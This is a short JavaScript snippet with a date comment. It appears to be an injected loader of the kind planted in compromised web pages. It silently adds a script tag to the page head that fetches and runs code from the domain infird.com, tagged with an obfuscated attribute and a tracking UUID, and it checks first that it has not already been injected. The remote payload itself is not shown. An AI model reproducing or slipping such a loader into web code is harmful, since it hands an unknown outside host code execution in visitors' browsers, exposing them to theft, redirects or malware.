(() => {
    if (document.querySelector('script[data-awssuidacr]') !== null) {
        return;
    }

    const head = document.querySelector('head');
    const awssuidacr = '06a09b0c-7d04-419c-9218-6cb104b07bc4';

    function createScript(url) {
        url = new URL(url);
        url.searchParams.append('uuid', awssuidacr);

        const script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url.href;
        script.dataset['awssuidacr'] = awssuidacr;

        head.appendChild(script);
    }

        createScript('https://infird.com/cdn/b50b7f30-3efc-40a4-958b-47c84a6ef83f');
    })();


// May 15, 2025 - 01:45 PM